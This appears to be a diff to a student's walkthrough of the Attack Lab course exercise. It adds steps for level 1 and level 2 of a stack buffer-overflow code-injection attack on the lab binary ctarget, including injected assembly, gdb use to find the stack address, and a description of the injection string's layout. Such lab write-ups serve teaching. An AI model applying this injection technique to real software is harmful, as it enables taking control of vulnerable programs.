@@ -1,6 +1,12 @@
 # Attack Lab
 
-## phase 1
+## level 1
+
+1. get assembly code
+
+    ```
+    objdump -d ctarget > c.txt
+    ```
 
 1. use gdb to run ctarget
 
@@ -37,3 +43,43 @@
     ```
     ./hex2raw < ctarget.1.txt | ./ctarget -q
     ```
+
+## level 2
+
+1. in assembly code find touch2
+
+    ```
+    00000000004017ec <touch2>:
+    ```
+
+    We see that touch2 has passed a parameter, and if the value of this parameter is equal to the cookie, it will be successful. The value of the cookie is in the given file cookie.txt, my cookie is 0x59b997fa.
+
+2. assembly code should be
+
+    ```
+    movq    $0x59b997fa, %rdi
+    pushq   $0x4017ec
+    ret
+    ```
+
+3. Compile on the command line 
+
+    ```
+    gcc -c l2.s
+    objdump -d l2.o
+    ```
+
+4. find %rsp using gdb
+
+    ```
+    gdb ctarget
+    (gdb) break *0x4017ac
+    (gdb) run -q
+    (gdb) info registers
+    ... 
+    rsp            0x5561dc78	0x5561dc78
+    ... 
+    ```
+
+5. get the %rsp address, and then write the injection string. The string is the injection code address + useless characters + return address.
+
